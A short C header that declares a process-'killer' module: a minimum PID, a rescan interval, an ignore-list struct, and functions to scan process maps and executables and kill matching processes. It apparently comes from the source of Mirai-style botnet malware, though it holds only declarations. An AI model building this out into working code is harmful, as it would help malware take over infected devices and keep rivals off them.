#pragma once

#include "includes.h"

enum
{
	KILLER_MIN_PID = 400,
	KILLER_RESTART_SCAN_TIME = 600,
};

struct killer_t
{
    uint16_t len;
    char *process_to_ignore;
    struct killer_t *next;
};

void kill_bad_processes(void);
static BOOL check_maps_for_match(char *);
static BOOL check_exe_for_match(char *);
void kill_killer(void);
